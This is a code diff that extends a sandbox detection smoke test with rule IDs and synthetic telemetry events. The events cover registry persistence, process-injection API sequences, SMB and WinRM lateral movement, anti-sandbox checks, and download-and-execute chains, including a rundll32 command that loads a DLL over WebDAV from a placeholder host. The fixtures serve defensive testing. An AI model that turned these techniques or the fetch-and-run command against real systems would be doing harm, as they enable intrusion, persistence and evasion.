@@ -46,7 +46,22 @@ internal sealed class BehaviorRuleExpansionScenario : ISmokeTestScenario
         "http-c2-suspicious-user-agent",
         "tls-sni-ja3-metadata-observed",
         "pcap-artifact-imported",
-        "pcap-protocol-summary-placeholder"
+        "pcap-protocol-summary-placeholder",
+        "persistence-runonceex-depend-dll-value",
+        "persistence-svchost-servicedll-user-writable",
+        "persistence-ifeo-globalflag-silentprocessexit",
+        "injection-atom-bombing-api-sequence",
+        "injection-writeprocessmemory-followed-by-protect-execute",
+        "injection-setthreadcontext-suspended-target",
+        "lateral-smb-admin-share-executable-write",
+        "lateral-winrm-wsman-create-shell-soap",
+        "lateral-smb-svcctl-pipe-open",
+        "anti-sandbox-low-interaction-count-gate",
+        "anti-sandbox-vm-mac-oui-check",
+        "anti-sandbox-resource-threshold-exit",
+        "download-execute-webdav-lolbin-url",
+        "download-execute-temp-cab-msi-chain",
+        "download-execute-ads-zoneidentifier-executable-launch"
     ];
 
     public string ScenarioId => "behavior.rules-expansion-coverage";
@@ -314,6 +329,170 @@ internal sealed class BehaviorRuleExpansionScenario : ISmokeTestScenario
                 Data =
                 {
                     ["protocols"] = "dns,http,tls"
+                }
+            },
+            new SandboxEvent
+            {
+                EventType = "registry.set",
+                Source = "driver",
+                Path = @"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend",
+                Data =
+                {
+                    ["path"] = @"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend",
+                    ["valueName"] = "Depend",
+                    ["value"] = @"C:\Users\Smoke\AppData\Local\Temp\stage.dll"
+                }
+            },
+            new SandboxEvent
+            {
+                EventType = "registry.set",
+                Source = "driver",
+                Path = @"HKLM\SYSTEM\CurrentControlSet\Services\SmokeSvc\Parameters\ServiceDll",
+                Data =
+                {
+                    ["path"] = @"HKLM\SYSTEM\CurrentControlSet\Services\SmokeSvc\Parameters\ServiceDll",
+                    ["valueName"] = "ServiceDll",
+                    ["value"] = @"C:\ProgramData\Smoke\svc.dll"
+                }
+            },
+            new SandboxEvent
+            {
+                EventType = "registry.set",
+                Source = "driver",
+                Path = @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe\GlobalFlag",
+                Data =
+                {
+                    ["path"] = @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe\GlobalFlag",
+                    ["valueName"] = "GlobalFlag",
+                    ["value"] = "0x200"
+                }
+            },
+            new SandboxEvent
+            {
+                EventType = "api.sequence",
+                Source = "guest",
+                ProcessName = "payload.exe",
+                Data =
+                {
+                    ["apiSequence"] = "GlobalAddAtomW NtQueueApcThread ResumeThread",
+                    ["targetProcessName"] = "explorer.exe"
+                }
+            },
+            new SandboxEvent
+            {
+                EventType = "api.sequence",
+                Source = "guest",
+                ProcessName = "payload.exe",
+                Data =
+                {
+                    ["targetIsRemote"] = "true",
+                    ["operation"] = "OpenProcess WriteProcessMemory VirtualProtectEx PAGE_EXECUTE_READ",
+                    ["targetProcessName"] = "notepad.exe"
+                }
+            },
+            new SandboxEvent
+            {
+                EventType = "api.sequence",
+                Source = "guest",
+                ProcessName = "payload.exe",
+                Data =
+                {
+                    ["operation"] = "CreateProcess CREATE_SUSPENDED NtUnmapViewOfSection SetThreadContext ResumeThread",
+                    ["targetProcessName"] = "svchost.exe"
+                }
+            },
+            new SandboxEvent
+            {
+                EventType = "file.created",
+                Source = "guest",
+                Path = @"\\TARGET\ADMIN$\stage\payload.exe"
+            },
+            new SandboxEvent
+            {
+                EventType = "pcap.http",
+                Source = "host",
+                Data =
+                {
+                    ["host"] = "target",
+                    ["uri"] = "/wsman",
+                    ["method"] = "POST",
+                    ["headers"] = "SOAPAction: http://schemas.microsoft.com/wbem/wsman/1/windows/shell/CreateShell"
+                }
+            },
+            new SandboxEvent
+            {
+                EventType = "smb.pipe.open",
+                Source = "host",
+                Data =
+                {
+                    ["share"] = @"\\TARGET\IPC$",
+                    ["pipeName"] = @"\svcctl",
+                    ["destinationIp"] = "10.0.0.20"
+                }
+            },
+            new SandboxEvent
+            {
+                EventType = "anti_sandbox.check",
+                Source = "guest",
+                ProcessName = "payload.exe",
+                Data =
+                {
+                    ["check"] = "user-interaction threshold mouse keyboard",
+                    ["observedCount"] = "0",
+                    ["threshold"] = "3"
+                }
+            },
+            new SandboxEvent
+            {
+                EventType = "process.start",
+                Source = "guest",
+                ProcessName = "payload.exe",
+                CommandLine = "payload.exe --check-mac 00:05:69",
+                Data =
+                {
+                    ["indicator"] = "00:05:69 VMware MAC OUI"
+                }
+            },
+            new SandboxEvent
+            {
+                EventType = "behavior.anti_analysis",
+                Source = "guest",
+                ProcessName = "payload.exe",
+                Data =
+                {
+                    ["check"] = "resource threshold cpu memory",
+                    ["action"] = "sleep",
+                    ["cpuCount"] = "1",
+                    ["memoryMb"] = "1024"
+                }
+            },
+            new SandboxEvent
+            {
+                EventType = "process.start",
+                Source = "guest",
+                ProcessName = "rundll32.exe",
+                CommandLine = @"rundll32.exe \\files.example@SSL\DavWWWRoot\pub\stage.dll,Entry"
+            },
+            new SandboxEvent
+            {
+                EventType = "download.execute",
+                Source = "guest",
+                ProcessName = "msiexec.exe",
+                Data =
+                {
+                    ["downloadPath"] = @"C:\Users\Smoke\AppData\Local\Temp\pkg.msi",
+                    ["executedPath"] = @"C:\Users\Smoke\AppData\Local\Temp\pkg.msi"
+                }
+            },
+            new SandboxEvent
+            {
+                EventType = "process.start",
+                Source = "guest",
+                ProcessName = "payload.exe",
+                CommandLine = @"C:\Users\Smoke\Downloads\payload.exe",
+                Data =
+                {
+                    ["zoneIdentifier"] = "ZoneId=3 Mark-of-the-Web"
                 }
             }
         ];
